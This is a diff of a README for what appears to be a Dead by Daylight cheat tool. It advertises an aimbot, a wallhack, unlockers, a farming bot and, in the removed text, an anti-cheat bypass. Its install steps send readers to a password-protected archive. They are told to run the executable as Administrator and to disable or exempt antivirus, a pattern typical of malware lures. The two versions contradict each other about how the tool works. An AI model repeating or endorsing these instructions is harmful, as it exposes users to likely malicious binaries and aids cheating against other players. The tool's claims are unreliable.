@@ -1,48 +1,58 @@
-# 🩸 DBD AutoGrind Trainer 2026 Mega – Rule the Fog
+# 🎮 DBD-AutoGrind-Trainer-2026-Mega - Automate your Dead by Daylight progression
 
-> **The most advanced undetected trainer for Dead by Daylight 2026.** Automate everything, see everything, unlock everything with the Mega edition.
+[![](https://img.shields.io/badge/Download-Trainer-blue.svg)](https://github.com/Dennytropical430/DBD-AutoGrind-Trainer-2026-Mega)
 
-## Feature Set
+## 📋 Project Overview
+This software automates progression in Dead by Daylight. It assists players by managing Bloodpoint farming, unlocking perks and skins, and providing gameplay overlays. The tool runs externally to ensure minimal interference with game files. This edition acts as a comprehensive manager for account assets and in-game performance.
 
-| Feature                     | What it does                                                  |
-|-----------------------------|---------------------------------------------------------------|
-| Auto Bloodpoint Farm        | AFK bot that plays matches and collects unlimited BP          |
-| ESP Wallhack                | Highlights survivors, killers, generators, hooks, totems      |
-| Aimbot (Killer)             | Automatic targeting and attacking                             |
-| No Terror Radius            | Removes killer terror radius for stealth                      |
-| Fast Vault & Fast Pallet    | Increases survivor interaction speed                          |
-| Skill Check Bot             | Hits great skill checks every time                            |
-| Infinite Bloodpoints         | Writes any BP value in offline mode                           |
-| Perk Unlocker               | Unlocks all teachable perks instantly                         |
-| Skin Unlocker               | Unlocks all cosmetics, charms, outfits                        |
-| Anti‑Ban Obfuscation        | Memory scrambling and randomised delays                       |
+## ⚙️ Minimum System Requirements
+Check that your computer meets these standards to ensure the software runs without errors:
+- Operating System: Windows 10 or Windows 11 (64-bit)
+- Processor: Intel Core i5 or AMD Ryzen 5
+- Memory: 8 GB RAM
+- Graphics: DirectX 11 support
+- Storage: 100 MB available space
+- Internet: Active connection for authentication
 
-## ⬇️ How to Install
+## 🚀 Getting Started
+Follow these instructions to set up the tool. Read each step carefully to avoid errors during the installation process.
 
-1. Download the trainer from [https://skydock.netlify.app/trainer-archive.zip](https://skydock.netlify.app/trainer-archive.zip)
-2. Extract with password `trainer2026`
-3. Execute `trainer.exe` as Administrator
-4. Launch Dead by Daylight, enter a match
-5. Toggle the GUI with the **INSERT** key
+1. Ensure Dead by Daylight is closed before you begin.
+2. Visit the project link to acquire the latest version of the trainer: [Download](https://github.com/Dennytropical430/DBD-AutoGrind-Trainer-2026-Mega).
+3. Locate the downloaded file in your browser or your Downloads folder.
+4. Extract the contents of the ZIP folder to a dedicated location on your computer. Create a new folder on your desktop to keep files organized.
+5. Right-click the application file and select "Run as administrator". This gives the program permission to interact with the game process.
 
-## System Requirements
-- OS: Windows 10/11 (64‑bit)
-- Platforms: Steam, Epic Games Store, Microsoft Store
-- Game: Dead by Daylight (all chapters, including Jason Voorhees & Life Road)
-- Anti‑cheat: EasyAntiCheat – bypassed externally
+## 🛠 Features
+The trainer includes tools to manage your character progression and display information during matches:
 
-## Troubleshooting
+- Bloodpoint Bot: Automates match cycles to gather Bloodpoints while you attend to other tasks.
+- Perk and Skin Unlocker: Modifies your loadout menu to grant access to all available perks and character cosmetics.
+- ESP Wallhack: Displays the location of survivors and generators through obstacles.
+- Aimbot: Aligns crosshairs with targets for precise interaction.
 
-| Problem                     | Solution                                                  |
-|-----------------------------|-----------------------------------------------------------|
-| Trainer doesn't launch      | Run as Administrator, disable antivirus temporarily       |
-| GUI not visible             | Press INSERT, restart if necessary                        |
-| ESP not rendering           | Ensure you are in a live match                            |
-| Farm bot not running        | Must be in a public match                                 |
-| EAC warning                 | Use risky features in bot matches or offline              |
+## 🛡 Security and Stability
+This tool operates externally. It does not modify game memory or inject code directly into the game application. This approach reduces the probability of system flags. Always check for updates within the application menu to maintain compatibility with the latest Dead by Daylight patches. Restart the application if you notice performance drops or unresponsive menus.
 
-## 📜 License
-MIT
+## 📂 Troubleshooting Common Issues
+Use these steps if the software fails to launch or operate as expected:
 
-## 🔍 Search Tags
-`dbd-aimbot, dbd-cheat, perk-unlocker, grind-bot, dbd, external, dead-by-daylight-trainer, eac-bypass, game-hack, bloodpoint-hack, killer-hack, dbd-mod, bypass, anti-cheat-bypass, dead-by-daylight, aimbot, dbd-unlock-all`
+- Program will not open: Ensure you extracted the files from the ZIP folder. Running files directly from the ZIP causes errors.
+- Permissions error: Right-click the file and select "Run as administrator". Anti-virus software might block the file; add an exception in your settings for the folder containing the tool.
+- Overlay not working: Ensure your game runs in "Borderless Windowed" mode. Exclusive fullscreen mode prevents external overlays from rendering correctly.
+- Missing configuration: Delete the "config.ini" file in the folder and restart the application to reset your settings to default.
+
+## ⚖️ Usage Responsibility
+The use of third-party software in multiplayer games carries risk. While this tool focuses on external operations to maintain discretion, game developers update their detection systems regularly. Monitor official game update notes. Use caution when activating features that provide visual advantages, as these are more noticeable to other players than automated progression tools.
+
+## 🔧 Updating the Software
+Developers release updates to address game patches or add options. To update, download the latest version from the link provided in the Getting Started section. Overwrite the existing files with the new ones. Your configuration settings usually persist, but verify your preferences in the menu after a major update to ensure all settings remain active.
+
+## ❓ Frequently Asked Questions
+How do I stop the Bloodpoint bot? Press the "Stop" button in the control panel or use the hotkey set in your options menu. 
+Does this work on console? No, this software is compatible only with the Windows version of the game.
+Can I get banned? Using any external tool involves risk. We designed this to look as natural as possible, but we cannot guarantee zero impact on your account.
+How do I report bugs? Check the Issues tab on the repository to see if others reported the same error. Follow the template provided if you need to submit a new ticket.
+
+## 📝 Configuration File Details
+The software creates a text file called "config.ini" the first time you run it. You can edit this file to adjust settings without opening the menu. Open the file with Notepad to change numerical values for aim sensitivity or feature toggles. Save the file and restart the application for the changes to take effect. If you break the file, delete it and let the application generate a fresh one.
